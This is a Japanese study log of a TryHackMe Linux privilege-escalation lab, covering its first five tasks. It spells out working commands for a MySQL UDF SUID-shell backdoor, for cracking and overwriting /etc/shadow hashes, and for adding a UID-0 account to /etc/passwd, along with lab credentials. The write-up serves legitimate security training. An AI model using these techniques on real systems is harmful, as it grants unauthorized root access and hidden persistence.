# TryHackMe: Linux PrivEsc

> **ルーム:** [Linux PrivEsc](https://tryhackme.com/room/linprivesc)
> **学習日:** 2026-05-24 〜
> **進捗:** Task 1〜5 完了（24%）
> **初期認証情報:** `user:password321`（SSH接続可）

---

## ルーム概要

意図的に脆弱な設定にされたDebian VMを使い、Linuxの権限昇格（Privilege Escalation）の手法を実践する。  
一般ユーザー（`user`）として侵入し、`root` 権限を奪取するさまざまな経路を体験する。

---

## タスク一覧

| Task | タイトル | カテゴリ |
|------|---------|---------|
| Task 1 | Deploy the Vulnerable Debian VM | 環境構築 |
| Task 2 | Service Exploits | サービス脆弱性 |
| Task 3 | Weak File Permissions - Readable /etc/shadow | ファイルパーミッション |
| Task 4 | Weak File Permissions - Writable /etc/shadow | ファイルパーミッション |
| Task 5 | Weak File Permissions - Writable /etc/passwd | ファイルパーミッション |
| Task 6 | Sudo - Shell Escape Sequences | sudo悪用 |
| Task 7 | Sudo - Environment Variables | sudo悪用 |
| Task 8 | Cron Jobs - File Permissions | cronジョブ悪用 |
| Task 9 | Cron Jobs - PATH Environment Variable | cronジョブ悪用 |
| Task 10 | Cron Jobs - Wildcards | cronジョブ悪用 |
| Task 11 | SUID / SGID Executables - Known Exploits | SUID/SGID悪用 |
| Task 12 | SUID / SGID Executables - Shared Object Injection | SUID/SGID悪用 |
| Task 13 | SUID / SGID Executables - Environment Variables | SUID/SGID悪用 |
| Task 14 | SUID / SGID Executables - Abusing Shell Features (#1) | SUID/SGID悪用 |
| Task 15 | SUID / SGID Executables - Abusing Shell Features (#2) | SUID/SGID悪用 |
| Task 16 | Passwords & Keys - History Files | パスワード・鍵 |
| Task 17 | Passwords & Keys - Config Files | パスワード・鍵 |
| Task 18 | Passwords & Keys - SSH Keys | パスワード・鍵 |
| Task 19 | NFS | NFS悪用 |
| Task 20 | Kernel Exploits | カーネル脆弱性 |
| Task 21 | Privilege Escalation Scripts | 自動化ツール |

---

## 事前知識メモ

### 権限昇格とは

- 一般ユーザー権限でシステムに侵入後、設定ミスや脆弱性を利用して `root` 権限を奪取すること
- 「侵入」の次のステップとして必須の技術

### 主な権限昇格の経路（このルームで扱うもの）

| 手法 | 概要 |
|-----|------|
| **ファイルパーミッション不備** | `/etc/shadow`（パスワードハッシュ）や `/etc/passwd` が一般ユーザーに読み書きされている |
| **sudo 設定ミス** | `sudo -l` で確認できる許可コマンドを悪用してシェルエスケープ |
| **Cron ジョブ** | root 実行の定期ジョブが書き換え可能なスクリプトを呼んでいる |
| **SUID/SGID ビット** | root 所有でSUIDが付いた実行ファイルを悪用 |
| **パスワードの平文保存** | シェル履歴・設定ファイル・SSH秘密鍵の漏洩 |
| **NFS の no_root_squash** | NFS マウントに root として書き込みができてしまう設定 |
| **カーネルエクスプロイト** | カーネルバージョンの既知脆弱性を使ったroot奪取 |

---

---

## Task 1: Deploy the Vulnerable Debian VM

SSH でターゲットに接続して開始する。

```bash
ssh user@<ターゲットIP>
# パスワード: password321
```

接続後、`id` コマンドで現在の権限を確認する。

```
uid=1000(user) gid=1000(user) groups=1000(user),...
```

---

## Task 2: Service Exploits

### 概要

root 権限で動作しているMySQLサービスに**パスワードなし**でログインできる設定ミスを悪用する。  
MySQL の User Defined Function（UDF）機能を使ってOSコマンドをroot権限で実行させ、SUIDバックドアを作成する。

### 仕組み（攻撃の本質）

「最小権限の原則」の崩壊。不要に高い権限を持つサービス（MySQL as root）が一つでも存在すれば、それがシステム全体への侵入経路になる。

### 手順

```bash
# 1. 攻撃コード（C言語）を共有ライブラリにコンパイル
cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# 2. MySQLにrootとして接続（パスワードなし）
mysql -u root
```

```sql
-- 3. .soファイルをMySQLプラグインディレクトリへ配置し、UDFを登録
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

-- 4. root権限でSUID付きbashバックドアを作成
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
exit
```

```bash
# 5. バックドアを実行してroot権限を取得
/tmp/rootbash -p
# プロンプトが rootbash-4.1# に変わればroot権限取得成功

# 6. 後処理（次のタスクに進む前に必ず削除）
rm /tmp/rootbash
exit
```

---

## Task 3: Weak File Permissions - Readable /etc/shadow

### 概要

`/etc/shadow`（パスワードハッシュファイル）が world-readable になっている設定ミスを悪用する。  
ハッシュを盗み出し、**攻撃マシン（AttackBox）側で**オフラインクラックする。

### 仕組み（攻撃の本質）

ターゲットに負荷をかけず、アラートも鳴らさずにパスワードを複製する**ステルス攻撃**。

### 手順

```bash
# ターゲットマシン（user@debian）上で実行
ls -l /etc/shadow          # world-readableを確認
cat /etc/shadow            # ハッシュを確認
```

```
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:...
```

```bash
# 攻撃マシン（AttackBox: root@ip-...）上で実行
echo "root:\$6\$Tb/euwmK\$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### 結果

| 項目 | 値 |
|-----|---|
| rootのパスワードハッシュ | `$6$Tb/euwmK$OXA.dwMeOAco...` |
| ハッシュアルゴリズム | `sha512crypt`（`$6$` プレフィックスが目印） |
| クラックされたパスワード | `password123` |

```bash
# ターゲットマシン上でrootに昇格
su root
# パスワード: password123
```

### 重要：攻撃マシンとターゲットマシンの使い分け

| 作業 | 実行場所 |
|-----|---------|
| `/etc/shadow` の確認 | ターゲットマシン（`user@debian`） |
| john でのクラック | **攻撃マシン（AttackBox）** |
| `su root` でのログイン | ターゲットマシン |

john はターゲットにはインストールされていない。`/tmp/rootbash -p` で root になっても、その root はまだターゲットマシンの内部にいるだけで攻撃マシンではない。

---

## Task 4: Weak File Permissions - Writable /etc/shadow

### 概要

`/etc/shadow` が world-writable になっている設定ミスを悪用する。  
元のハッシュを**直接上書き**してrootパスワードを自分のものに書き換える。

### 仕組み（攻撃の本質）

Task 3（読み取り→解析）が「合鍵を作る」攻撃なら、Task 4は「錠前ごと付け替える」破壊的な攻撃。

### 手順

```bash
# ターゲットマシン（user@debian）上で実行

# 1. world-writableを確認
ls -l /etc/shadow
# -rw-r--rw- 1 root shadow ... /etc/shadow

# 2. 新しいパスワードハッシュを生成
mkpasswd -m sha-512 hacked123
# 出力例: $6$WbEOGIRta$6eBBsP/...

# 3. /etc/shadowを編集してrootのハッシュを上書き
nano /etc/shadow
# root: の直後のハッシュ部分を上記の出力に置き換える
# Ctrl+O → Enter で保存、Ctrl+X で終了

# 4. 新しいパスワードでrootに昇格
su root
# パスワード: hacked123
```

### 実戦での禁忌

Task 4の手法は**実際のペネトレーションテストでは絶対に使ってはいけない**。

| リスク | 理由 |
|-------|------|
| 即時検知 | 本物の管理者がログイン不能になった瞬間にインシデント発生 |
| 復元不能 | 元のパスワードを知らないためテスト後にシステムを元に戻せない |
| 破壊行為 | ペネトレーションテストの目的は「破壊」ではなく「リスクの証明」 |

CTFラボだから許される手法。手法を知ることと、いつ使うかを判断できることは別次元。

---

## Task 5: Weak File Permissions - Writable /etc/passwd

### 概要

`/etc/passwd` が world-writable になっている設定ミスを悪用する。  
`/etc/shadow` ではなく `/etc/passwd` 自体にパスワードハッシュを直接書き込み、認証を掌握する。

### 仕組み（攻撃の本質）

現代のLinuxでは、パスワードハッシュは `/etc/shadow` に隔離されている。`/etc/passwd` のパスワードフィールドには通常 `x` が入っており、これはシステムへの指示標識だ—「パスワードの検証は `/etc/shadow` を参照せよ」という意味。

この `x` を削除して**パスワードハッシュを直接書き込む**と、システムはレガシーな動作にフォールバックし、`/etc/shadow` を無視して `/etc/passwd` のハッシュで認証を通してしまう。

### /etc/passwd のフィールド構造

```
ユーザー名:パスワードフィールド:UID:GID:コメント:ホームディレクトリ:シェル
root:x:0:0:root:/root:/bin/bash
```

**UID 0 = 神（root）**。システムはユーザー名ではなくUIDで権限を判断する。名前が `newroot` でも `nobody` でも、UID が 0 なら完全なroot権限を持つ。

### 手順

```bash
# ターゲットマシン（user@debian）上で実行

# 1. world-writableを確認
ls -l /etc/passwd
# -rw-r--rw- 1 root root ... /etc/passwd

# 2. openssl でパスワードハッシュを生成（DES形式、短い文字列が出力される）
openssl passwd <任意のパスワード>
# 出力: <生成されたハッシュ>（必ずコピー）

# 3. /etc/passwd の末尾に新規ユーザーを追記
nano /etc/passwd
```

```
# ファイル末尾に以下を追記（[ハッシュ] は Step 2 の出力に置き換え）
newroot:[生成されたハッシュ]:0:0:root:/root:/bin/bash
```

```bash
# 4. 作成したバックドアアカウントでログイン
su newroot
# パスワード: Step 2 で設定したもの

# 5. root権限を確認
id
# uid=0(root) gid=0(root) groups=0(root)
```

### Task 4 との比較：より高度な手法

| 比較軸 | Task 4（shadow上書き） | Task 5（passwd追記） |
|-------|----------------------|---------------------|
| 操作の破壊性 | 既存 root のパスワードを破壊 | 元の root を一切変更しない |
| 管理者への影響 | 管理者が即座にログイン不能 | 管理者は通常通りログイン可能 |
| ステルス性 | 低（即時検知） | 高（気づかれにくい） |
| 実戦での評価 | 三流の手法 | バックドア作成という実践的手法 |

既存の `root` を上書きするのではなく、**UID 0 のクローンを別名で作る**。これが「元のシステムを壊さずに特権アクセスを維持する」というペネトレーションテストの本質的アプローチだ。

### openssl passwd と mkpasswd の違い

| コマンド | アルゴリズム | 用途 |
|---------|------------|------|
| `openssl passwd` | DES（デフォルト） | `/etc/passwd` への書き込み（レガシー形式） |
| `mkpasswd -m sha-512` | SHA-512 | `/etc/shadow` への書き込み（現代の形式） |

`/etc/passwd` に書き込む場合は `openssl passwd` を使う。`mkpasswd` で生成したSHA-512ハッシュでは動作しない。

### 今回の最大の教訓：「自分が今どこにいるか」の確認を怠るな

このTaskで陥りやすいミス：AttackBox（自分の攻撃マシン）上で `/etc/passwd` を編集してしまう。

| 確認ポイント | ターゲットマシン | AttackBox（攻撃マシン） |
|------------|---------------|----------------------|
| プロンプト表記 | `user@debian:~$` | `root@ip-XX-XX-XX-XX:~#` |
| `/etc/passwd` の権限 | `-rw-r--rw-`（world-writable = 脆弱） | `-rw-r--r--`（通常状態） |
| この手法が「脆弱性の悪用」になる条件 | 一般ユーザーとして実行している | すでにrootなので脆弱性でも何でもない |

**AttackBox上で作業していた場合の見分け方：**
1. `ls -l /etc/passwd` の出力が `-rw-r--r--`（world-writableでない）
2. プロンプトに `root@ip-` が含まれている
3. `id` で最初から `uid=0(root)` が返ってくる

この状態で「成功した」と思うのは自己欺瞞。必ずターゲットマシンに SSH で入り直してから作業すること。

---

## 次回の予定

Task 6: Sudo - Shell Escape Sequences から再開

---

## 関連リソース

- [TryHackMe: Linux PrivEsc](https://tryhackme.com/room/linprivesc)
- [GTFOBins](https://gtfobins.github.io/) — SUID/sudo悪用の参照
- [HackTricks: Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
